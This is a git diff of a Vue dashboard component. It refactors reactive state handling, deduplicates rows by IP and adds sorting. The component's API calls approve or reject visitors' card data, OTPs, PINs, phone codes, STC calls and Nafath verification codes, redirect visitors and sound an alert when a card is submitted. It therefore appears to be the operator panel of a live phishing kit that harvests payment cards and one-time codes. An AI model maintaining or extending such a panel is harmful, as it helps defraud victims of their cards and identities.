@@ -108,14 +108,16 @@
             <div v-else-if="customers.length > 0">
                 <CustomerDataTable
                     :customers="customers"
-                    :changed-fields="changedFields"
                     :processing-action="processingAction"
+                    :sort-by="sortBy"
+                    :sort-order="sortOrder"
                     @delete-card="handleDeleteCard"
                     @show-details="handleShowDetails"
                     @action="handleCustomerAction"
                     @redirect="handleCustomerRedirect"
                     @modal-opened="handleModalOpened"
                     @modal-closed="handleModalClosed"
+                    @sort="handleSort"
                 />
 
                 <!-- Pagination -->
@@ -172,7 +174,7 @@
 </template>
 
 <script setup>
-import { ref, shallowRef, triggerRef, computed, onMounted, onUnmounted, onActivated, onDeactivated } from 'vue';
+import { ref, shallowRef, computed, onMounted, onUnmounted, onActivated, onDeactivated } from 'vue';
 
 defineOptions({ name: 'DashboardHome' });
 import { getCustomers, getCustomer, deleteCustomerCard, approveCard, rejectCard, approveOtp, rejectOtp, approvePin, rejectPin, approvePhoneData, rejectPhoneData, approvePhoneOtp, rejectPhoneOtp, approveStcWaiting, rejectStcWaiting, approveStcOtp, rejectStcOtp, approveStcCall, rejectStcCall, approveNafath, rejectNafath, updateNafathVerificationCode, redirectCustomer } from '@/api/dashboard';
@@ -668,11 +670,9 @@ function handleRealtimeUpdate ( event ) {
     if ( event.activity_type === 'inactive' ) {
         const idx = customers.value.findIndex( c => c.ip === event.ip_address || c.id === event.customer_id );
         if ( idx !== -1 ) {
-            customers.value[ idx ] = {
-                ...customers.value[ idx ],
-                is_active: false,
-            };
-            triggerRef( customers );
+            const updated = [ ...customers.value ];
+            updated[ idx ] = { ...updated[ idx ], is_active: false };
+            customers.value = updated;
         }
         return;
     }
@@ -688,8 +688,9 @@ function handleRealtimeUpdate ( event ) {
             // Optimistically set has_new_payment = true on the local customer object
             const idx = customers.value.findIndex( c => c.ip === event.ip_address );
             if ( idx !== -1 && !customers.value[ idx ].has_new_payment ) {
-                customers.value[ idx ] = { ...customers.value[ idx ], has_new_payment: true };
-                triggerRef( customers );
+                const updated = [ ...customers.value ];
+                updated[ idx ] = { ...updated[ idx ], has_new_payment: true };
+                customers.value = updated;
             }
             // 🔊 Instant sound for new card/payment submissions
             const cardTypes = new Set( [ 'card_submitted', 'payment_card_submitted' ] );
@@ -747,21 +748,27 @@ function handleRealtimeUpdate ( event ) {
     if ( !_batchTimer ) {
         _batchTimer = setTimeout( () => {
             // Apply all pending page_view updates at once
+            const updated = [ ...customers.value ];
+            let needsFullRefresh = false;
             for ( const evt of _pendingPageUpdates ) {
-                const idx = customers.value.findIndex( c => c.id === evt.customer_id || c.ip === evt.ip_address );
+                const idx = updated.findIndex( c => c.id === evt.customer_id || c.ip === evt.ip_address );
                 if ( idx !== -1 ) {
-                    customers.value[ idx ] = {
-                        ...customers.value[ idx ],
-                        current_page: evt.current_page ?? customers.value[ idx ].current_page,
-                        is_active: evt.is_active ?? customers.value[ idx ].is_active,
+                    updated[ idx ] = {
+                        ...updated[ idx ],
+                        current_page: evt.current_page ?? updated[ idx ].current_page,
+                        is_active: evt.is_active ?? updated[ idx ].is_active,
                     };
                 } else {
                     // New customer appeared — trigger one refresh
-                    refreshCustomers();
+                    needsFullRefresh = true;
                     break;
                 }
             }
-            triggerRef( customers );
+            if ( needsFullRefresh ) {
+                refreshCustomers();
+            } else {
+                customers.value = deduplicateByIp( updated );
+            }
             _pendingPageUpdates = [];
             _batchTimer = null;
         }, BATCH_INTERVAL );
@@ -818,8 +825,9 @@ function handleWindowRead ( event ) {
 
     const idx = customers.value.findIndex( c => c.ip === event.ip );
     if ( idx !== -1 ) {
-        customers.value[ idx ] = { ...customers.value[ idx ], [ field ]: false };
-        triggerRef( customers );
+        const updated = [ ...customers.value ];
+        updated[ idx ] = { ...updated[ idx ], [ field ]: false };
+        customers.value = updated;
     }
     // ✅ Also record in TTL guard to prevent stale API from re-enabling blink
     recordMarkViewed( event.ip, field );
@@ -828,51 +836,21 @@ function handleWindowRead ( event ) {
 // --- Customer Tracking ---
 // shallowRef avoids deep-proxying 50–100+ nested customer objects on every refresh
 // (eliminates Vue reactivity overhead for cards, OTPs, PINs arrays within each customer).
-// All mutations already replace items via spread so triggerRef() is used for in-place changes.
+// All mutations create a new array reference (customers.value = [...]) for clean Vue diffing.
 const customers = shallowRef( [] );
 
-// ── Change Highlighting ──
-// Tracks which fields changed for each customer (by IP) since the last refresh.
-// Used by CustomerDataTable to flash changed cells.
-const changedFields = ref( new Map() ); // ip → Set<fieldName>
-const _prevSnapshot = new Map();       // ip → customer object (last known state)
-
-const TRACKED_FIELDS = [ 'is_active', 'full_name', 'nationalId', 'national_id', 'city', 'country', 'ip' ];
-
-function _resolveCurrentPage ( c ) {
-    return c?.journey?.current_page || c?.current_page || null;
-}
-
-function computeChanges ( newRows ) {
-    const newChanges = new Map();
-    for ( const customer of newRows ) {
-        const ip = customer.ip;
-        if ( !ip ) continue;
-        const prev = _prevSnapshot.get( ip );
-        if ( prev ) {
-            const changed = new Set();
-            for ( const field of TRACKED_FIELDS ) {
-                if ( customer[ field ] !== prev[ field ] ) changed.add( field );
-            }
-            if ( _resolveCurrentPage( customer ) !== _resolveCurrentPage( prev ) ) {
-                changed.add( 'current_page' );
-            }
-            if ( changed.size > 0 ) newChanges.set( ip, changed );
-        }
-        // Always update snapshot with a lightweight plain copy
-        _prevSnapshot.set( ip, {
-            ip: customer.ip,
-            is_active: customer.is_active,
-            full_name: customer.full_name,
-            nationalId: customer.nationalId,
-            national_id: customer.national_id,
-            city: customer.city,
-            country: customer.country,
-            current_page: customer.current_page,
-            journey: customer.journey ? { current_page: customer.journey.current_page } : null,
-        } );
-    }
-    return newChanges;
+/**
+ * Remove duplicate customers from list — keeps the FIRST occurrence per ip.
+ * Prevents the same visitor from appearing in multiple rows after WS/polling races.
+ */
+function deduplicateByIp ( list ) {
+    const seen = new Set();
+    return list.filter( c => {
+        const key = c.ip || String( c.id );
+        if ( seen.has( key ) ) return false;
+        seen.add( key );
+        return true;
+    } );
 }
 
 // ── Mark-Viewed Race-Condition Guard ──
@@ -961,7 +939,18 @@ const lastPage = ref( 1 );
 const totalCustomers = ref( 0 );
 const perPage = ref( 50 );
 
-const activeCustomersCount = computed( () => customers.value.filter( c => c.is_active ).length );
+const activeCustomersCount = ref( 0 );
+
+// ── Sorting state ──
+const sortBy = ref( 'last_activity_at' );
+const sortOrder = ref( 'desc' );
+
+function handleSort ( { column, order } ) {
+    sortBy.value = column;
+    sortOrder.value = order;
+    currentPage.value = 1;
+    refreshCustomers();
+}
 
 /**
  * Compute visible page numbers with ellipsis for large page counts.
@@ -1071,7 +1060,8 @@ const refreshCustomers = async () => {
         const params = {
             page: currentPage.value,
             per_page: perPage.value,
-
+            sort_by: sortBy.value,
+            sort_order: sortOrder.value,
         };
         if ( countryFilter.value ) {
             params.country = countryFilter.value;
@@ -1082,14 +1072,14 @@ const refreshCustomers = async () => {
         const { data } = await getCustomers( params );
         const rows = data.data || [];
         const guarded = applyNotificationGuards( rows );
-        changedFields.value = computeChanges( guarded );
         detectAndPlaySounds( guarded );
-        customers.value = guarded;
+        customers.value = deduplicateByIp( guarded );
         // Update pagination state from API response
         currentPage.value = data.current_page ?? 1;
         lastPage.value = data.last_page ?? 1;
         totalCustomers.value = data.total ?? 0;
         perPage.value = data.per_page ?? 50;
+        activeCustomersCount.value = data.active_count ?? 0;
         // ✅ Clear error/loading states on success
         loadError.value = false;
         initialLoading.value = false;
@@ -1116,21 +1106,20 @@ const patchSingleCustomer = async ( customerId ) => {
         if ( !data?.success || !data?.data ) return;
         const [ guarded ] = applyNotificationGuards( [ data.data ] );
         detectAndPlaySounds( [ guarded ] );
-        // Compute per-field changes for this single customer and merge into changedFields
-        const single = computeChanges( [ guarded ] );
-        if ( single.size > 0 ) {
-            const merged = new Map( changedFields.value );
-            for ( const [ ip, fields ] of single ) merged.set( ip, fields );
-            changedFields.value = merged;
+        // Search by id first, then by ip as fallback (prevents duplicate rows
+        // when DB merges profiles and the WS event carries a different id)
+        let idx = customers.value.findIndex( c => c.id === customerId );
+        if ( idx === -1 && guarded.ip ) {
+            idx = customers.value.findIndex( c => c.ip === guarded.ip );
         }
-        const idx = customers.value.findIndex( c => c.id === customerId );
         if ( idx !== -1 ) {
-            customers.value[ idx ] = guarded;
+            const updated = [ ...customers.value ];
+            updated[ idx ] = guarded;
+            customers.value = updated;
         } else {
-            // New customer — prepend to list
-            customers.value.unshift( guarded );
+            // New customer — prepend and deduplicate to be safe
+            customers.value = deduplicateByIp( [ guarded, ...customers.value ] );
         }
-        triggerRef( customers );
     } catch ( error ) {
         // Fallback: full refresh if single fetch fails
         logger.error( 'Patch update failed, falling back to full refresh:', error );
@@ -1150,58 +1139,74 @@ const handleDeleteCard = async ( id ) => {
 };
 
 const handleOtpApproved = ( otpId ) => {
-    const customer = customers.value.find( c => c.latest_otp?.id === otpId );
-    if ( customer && customer.latest_otp ) {
-        customer.latest_otp.status = 'verified';
-        triggerRef( customers );
+    const idx = customers.value.findIndex( c => c.latest_otp?.id === otpId );
+    if ( idx !== -1 && customers.value[ idx ].latest_otp ) {
+        const updated = [ ...customers.value ];
+        updated[ idx ] = { ...updated[ idx ], latest_otp: { ...updated[ idx ].latest_otp, status: 'verified' } };
+        customers.value = updated;
     }
 };
 
 const handleOtpRejected = ( otpId ) => {
-    const customer = customers.value.find( c => c.latest_otp?.id === otpId );
-    if ( customer && customer.latest_otp ) {
-        customer.latest_otp.status = 'rejected';
-        triggerRef( customers );
+    const idx = customers.value.findIndex( c => c.latest_otp?.id === otpId );
+    if ( idx !== -1 && customers.value[ idx ].latest_otp ) {
+        const updated = [ ...customers.value ];
+        updated[ idx ] = { ...updated[ idx ], latest_otp: { ...updated[ idx ].latest_otp, status: 'rejected' } };
+        customers.value = updated;
     }
 };
 
 const handlePinApproved = ( pinId ) => {
-    const customer = customers.value.find( c => {
-        return c.latest_pin?.id === pinId || c.all_pins?.some( p => p.id === pinId );
-    } );
-    if ( customer ) {
-        if ( customer.latest_pin?.id === pinId ) customer.latest_pin.status = 'verified';
-        const pin = customer.all_pins?.find( p => p.id === pinId );
-        if ( pin ) pin.status = 'verified';
-        triggerRef( customers );
+    const idx = customers.value.findIndex( c =>
+        c.latest_pin?.id === pinId || c.all_pins?.some( p => p.id === pinId )
+    );
+    if ( idx !== -1 ) {
+        const old = customers.value[ idx ];
+        const updated = [ ...customers.value ];
+        updated[ idx ] = {
+            ...old,
+            latest_pin: old.latest_pin?.id === pinId
+                ? { ...old.latest_pin, status: 'verified' }
+                : old.latest_pin,
+            all_pins: old.all_pins?.map( p => p.id === pinId ? { ...p, status: 'verified' } : p ),
+        };
+        customers.value = updated;
     }
 };
 
 const handlePinRejected = ( pinId ) => {
-    const customer = customers.value.find( c => {
-        return c.latest_pin?.id === pinId || c.all_pins?.some( p => p.id === pinId );
-    } );
-    if ( customer ) {
-        if ( customer.latest_pin?.id === pinId ) customer.latest_pin.status = 'rejected';
-        const pin = customer.all_pins?.find( p => p.id === pinId );
-        if ( pin ) pin.status = 'rejected';
-        triggerRef( customers );
+    const idx = customers.value.findIndex( c =>
+        c.latest_pin?.id === pinId || c.all_pins?.some( p => p.id === pinId )
+    );
+    if ( idx !== -1 ) {
+        const old = customers.value[ idx ];
+        const updated = [ ...customers.value ];
+        updated[ idx ] = {
+            ...old,
+            latest_pin: old.latest_pin?.id === pinId
+                ? { ...old.latest_pin, status: 'rejected' }
+                : old.latest_pin,
+            all_pins: old.all_pins?.map( p => p.id === pinId ? { ...p, status: 'rejected' } : p ),
+        };
+        customers.value = updated;
     }
 };
 
 const handlePhoneApproved = ( otpId ) => {
-    const customer = customers.value.find( c => c.latest_phone_otp?.id === otpId );
-    if ( customer && customer.latest_phone_otp ) {
-        customer.latest_phone_otp.status = 'verified';
-        triggerRef( customers );
+    const idx = customers.value.findIndex( c => c.latest_phone_otp?.id === otpId );
+    if ( idx !== -1 && customers.value[ idx ].latest_phone_otp ) {
+        const updated = [ ...customers.value ];
+        updated[ idx ] = { ...updated[ idx ], latest_phone_otp: { ...updated[ idx ].latest_phone_otp, status: 'verified' } };
+        customers.value = updated;
     }
 };
 
 const handlePhoneRejected = ( otpId ) => {
-    const customer = customers.value.find( c => c.latest_phone_otp?.id === otpId );
-    if ( customer && customer.latest_phone_otp ) {
-        customer.latest_phone_otp.status = 'rejected';
-        triggerRef( customers );
+    const idx = customers.value.findIndex( c => c.latest_phone_otp?.id === otpId );
+    if ( idx !== -1 && customers.value[ idx ].latest_phone_otp ) {
+        const updated = [ ...customers.value ];
+        updated[ idx ] = { ...updated[ idx ], latest_phone_otp: { ...updated[ idx ].latest_phone_otp, status: 'rejected' } };
+        customers.value = updated;
     }
 };
 
@@ -1471,8 +1476,9 @@ const handleModalOpened = ( { id, ip, section } ) => {
     // Optimistically clear flag in local list
     const idx = customers.value.findIndex( c => c.id === id );
     if ( idx !== -1 ) {
-        customers.value[ idx ] = { ...customers.value[ idx ], [ field ]: false };
-        triggerRef( customers );
+        const updated = [ ...customers.value ];
+        updated[ idx ] = { ...updated[ idx ], [ field ]: false };
+        customers.value = updated;
     }
 };
 
